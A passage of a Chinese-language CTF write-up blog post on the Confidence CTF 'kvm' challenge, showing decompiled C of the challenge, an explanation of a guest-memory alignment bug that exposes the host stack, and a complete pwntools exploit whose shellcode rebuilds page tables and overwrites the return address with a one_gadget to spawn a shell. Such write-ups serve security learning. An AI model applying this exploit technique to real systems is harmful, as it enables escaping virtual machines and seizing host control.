class="line">    &#123;</span><br><span class="line">      errno_set_user_memory = ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region);</span><br><span class="line">      err(errno_set_user_memory, <span class="string">"fail line: %d"</span>, <span class="number">52L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae41 : KVM_CREATE_VCPU</span></span><br><span class="line">    vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0L</span>L);         <span class="comment">// 创建vCPU</span></span><br><span class="line">    <span class="keyword">if</span> ( vcpu &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0L</span>L);</span><br><span class="line">      vcpu = errno_create_vcpu;</span><br><span class="line">      err(errno_create_vcpu, <span class="string">"fail line: %d"</span>, <span class="number">55L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xAE04uLL : KVM_GET_VCPU_MMAP_SIZE</span></span><br><span class="line">    vcpu_mmap_size = ioctl(kvmfd, <span class="number">0xAE04</span>uLL, <span class="number">0L</span>L);<span class="comment">// 为vCPU分配内存空间</span></span><br><span class="line">    run_mem = mmap(<span class="number">0L</span>L, vcpu_mmap_size, <span class="number">3</span>, <span class="number">1</span>, vcpu, <span class="number">0L</span>L);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs._rsp = <span class="number">0xFF0</span>LL;</span><br><span class="line">    guest_regs.rflags = <span class="number">2L</span>L;</span><br><span class="line">    <span class="comment">// 0x4090ae82 : KVM_SET_REGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs) &lt; <span class="number">0</span> )<span class="comment">// 设置寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_regs = ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs);</span><br><span class="line">      err(errno_set_regs, <span class="string">"fail line: %d"</span>, <span class="number">66L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x8138AE83uLL : KVM_GET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 获取特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_get_sregs = ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_get_sregs, <span class="string">"fail line: %d"</span>, <span class="number">69L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">    v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">    v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">    v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">    *(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3L</span>L;         <span class="comment">// 设置4级页表,因为cr0对应的第31位的值为1,所以说开启了分页机制所以就需要设置4级页表</span></span><br><span class="line">                                                <span class="comment">// 这里看了一眼汇编代码这里虽然加的是0xe00,但是对应汇编代码加的还是0x7000</span></span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v21] = v20 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v22] = v21 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v23] = v22 | <span class="number">3</span>;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    v27 = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.cr3 = v23;</span><br><span class="line">    guest_sregs.cr4 = <span class="number">32L</span>L;</span><br><span class="line">    guest_sregs.cr0 = <span class="number">0x80050033</span>LL;</span><br><span class="line">    guest_sregs.efer = <span class="number">0x500</span>LL;</span><br><span class="line">    guest_sregs.cs.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.cs.limit = <span class="number">0x10B0008FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.cs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ss.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.ss.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ss.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.gs.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.gs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.gs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.fs.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.fs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.fs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.es.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.es.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.es.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ds.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.ds.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ds.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    <span class="comment">// 0x4138AE84 : KVM_SET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 设置特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_sregs = ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_set_sregs, <span class="string">"fail line: %d"</span>, <span class="number">105L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae80 : KVM_RUN</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ioctl(vcpu, <span class="number">0xAE80</span>uLL, <span class="number">0L</span>L);              <span class="comment">// 开始运行虚拟机</span></span><br><span class="line">      exit_reason = run_mem-&gt;exit_reason;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">5</span> || exit_reason == <span class="number">8</span> )<span class="comment">// KVM_EXIT_HLT | KVM_EXIT_SHUTDOWN</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">2</span> )                   <span class="comment">// KVM_EXIT_IO</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( run_mem-&gt;io.direction == <span class="number">1</span> &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3F8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = run_mem-&gt;io.<span class="built_in">size</span>;</span><br><span class="line">          v24 = run_mem-&gt;io.data_offset;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%.*s"</span>, v16 * run_mem-&gt;ex.error_code, run_mem + v24);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[loop] exit reason: %d\n"</span>, run_mem-&gt;exit_reason);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n[loop] goodbye!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[init] hold your horses"</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞点：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">aligned_guest_mem = &amp;guest_mem[<span class="number">4096L</span>L - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">region.slot = <span class="number">0L</span>L;</span><br><span class="line">region.guest_phys_addr = <span class="number">0L</span>L;</span><br><span class="line">region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">region.userspace_addr = aligned_guest_mem;</span><br></pre></td></tr></table></figure>

<p>从上面的代码可以看出程序预计给虚拟机分配0x8000大小的空间，然后进行了个对齐操作使得分配的真实地址为aligned_guest_mem，然后后面实际再给虚拟机分配的时候还是分配了0x8000大小的空间，这样就会导致虚拟机越界读到了主机的内存。</p>
<p>首先我们看到我们memset的地址如下</p>
<p><img src="/" alt="image-20200925224629609.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/vHc9aoD4Smt6XAw.png"></p>
<p>对齐后的地址如下。</p>
<p><img src="/" alt="image-20200925224707504.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/zHNjYs5uEqfrtDx.png"></p>
<p>通过动态调试我们发现返回地址所在地址<code>(0x7FFFFFFFDE68)</code>包含在<code>aligned_guest_mem(0x7FFFFFFF6000)</code>到<code>aligned_guest_mem+0x8000(0x7FFFFFFFE000)</code>内，注意此处的aligned_guest_mem是通过分配host的栈空间作为VM的进程空间。对于host来说地址是<code>aligned_guest_mem</code>到<code>aligned_guest_mem+0x8000</code>，而对于虚拟机来说地址是<code>0</code>到<code>0x8000</code>。</p>
<p><img src="/" alt="image-20200925225217368.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/EPRjwCrOscaJSbm.png"></p>
<p>用下图来更清晰的表示。</p>
<p><img src="/" alt="image-20200925224348738.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/9UJeq7CaGh4d3ID.png"></p>
<p>然后程序有两个输入点，第一个输入的值会作为第二个输入点的可输入长度然后第二个输入点，输入的内容可以作为shellcode执行。</p>
<p>下面就是利用这个地方，在动调的过程中可以发现最后main返回的地址是存储在over这个区域的，所以就需要对存储返回地址的地方进行写操作，写成onegadget的地址就可以拿到shell了，写操作需要注意的就是[0x1000]这样读0x1000地址存储的内容不一定会读到0x1000，因为有分页机制所以虚拟地址需要转换成物理地址才可以使用，还需要注意一点的是64位环境下使用的是4级页表是48位，然后分为9、9、9、12四段，如下图所示。</p>
<p><img src="/" alt="image-20200925230016886.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/N2RVtIPu9kFXejn.png"></p>
<p>根据这四段来获取到物理地址所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址。</p>
<p>具体的做法就是<strong>更改cr3的值</strong>，<strong>自己构造4级页表</strong>，<strong>促使[0x1000]这样访问到的内存就是0x7000地址处的内存</strong>，这里访问到0x7000是因为0x7000到0x8000包含了越界的部分，所以我们只需要循环遍历0x7000到0x8000以便找到ebp，从而控制执行流，其中页表的访问方式就应该是这样的，用我手画的图表示如下（以访问0x1000为例）：</p>
<p><img src="/" alt="image-20200925230906050.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/ZGhBCqprunD48x5.png"></p>
<p>后面的0x1003、0x2003、0x3003等在ida中可看到。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">*(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3L</span>L;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">*&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br></pre></td></tr></table></figure>

<p>所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址，然后把返回地址改成oengadget就可以拿到shell了。</p>
<p>exp最开始设置访问的地址是0x1020，然后一直循环访问到对应地址存储的内容不是0的地方，经过动调发现在retun的返回地址前只有3个地址是有内容的，再往前看都是0，所以循环结束后访问的地址就是return的返回地址-3，所以要修改retuen的地址就需要+3，然后把这个地址里面的内容修改成one_gadget就可以拿到shell了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p = process(<span class="string">"./kvm"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./kvm"</span>)</span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    mov qword ptr [0x1000], 0x2003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x2000], 0x3003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x3000], 0x0003</span></span><br><span class="line"><span class="string">    mov qword ptr [0x0], 0x3</span></span><br><span class="line"><span class="string">    mov qword ptr [0x8], 0x7003</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x1000</span></span><br><span class="line"><span class="string">    mov cr3, rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, 0x1020</span></span><br><span class="line"><span class="string">#############search ret#############</span></span><br><span class="line"><span class="string">look_for_ra:   </span></span><br><span class="line"><span class="string">    add rcx, 8</span></span><br><span class="line"><span class="string">    cmp qword ptr [rcx], 0</span></span><br><span class="line"><span class="string">    je look_for_ra</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    add rcx, 24</span></span><br><span class="line"><span class="string">#############overwrite ret#############</span></span><br><span class="line"><span class="string">overwrite_ra:  </span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rcx]</span></span><br><span class="line"><span class="string">    add rax, 0x249e6</span></span><br><span class="line"><span class="string">    mov qword ptr [rcx], rax</span></span><br><span class="line"><span class="string">    hlt</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">)</span><br><span class="line">log.success(<span class="string">'len = '</span>+str(len(payload)))</span><br><span class="line">p.send(<span class="string">"\x68\x00\x00\x00"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv(<span class="number">16</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>对于exp几个疑惑的点：</p>
<ul>
<li><p>0x1020 ：这里我本来写的是0x1000，但是没打通，在0x7000开始处我们写了四个字段，所以我们应该先跳过这四个字段开始，经过动态调试发现返回地址只有前面三个字段有内容，其他都是0，所以一次遍历到不为0为止，然后我们add 24，跳过这三个字段就能到达ret处。</p>
<p><img src="/" alt="image-20200925232304528.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/tph8ysFVoinqW1f.png"></p>
</li>
<li><p>0x249e6 : 这里是返回地址到one_gadget地址的偏移，动态调试后发现execve_addr-ret_addr=0x249e6。</p>
</li>
</ul>
<p>成功利用截图：</p>
<p><img src="/" alt="image-20200925232856994.png" class="lazyload" data-src="https://i.loli.net/2020/09/25/T2rDMolGOvBZkJI.png"></p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">C7</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://billyotry.github.io/2020/10/05/[Confidence%20CTF]kvm/">https://billyotry.github.io/2020/10/05/[Confidence%20CTF]kvm/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://billyotry.github.io" target="_blank">C7</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/10/05/OkMu26JEdRlGBqX.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2020/09/14/%E3%80%90ASAN%E3%80%91%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"><img class="next_cover lazyload" data-src="https://i.loli.net/2020/07/11/7iqMC5nFhaEZojI.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【ASAN】简单使用指南</div></div></a></div></nav></article></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/10/05/OkMu26JEdRlGBqX.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By C7</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://jerryc.me/" target="_blank" rel="noopener">blog</a>!</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script></body></html>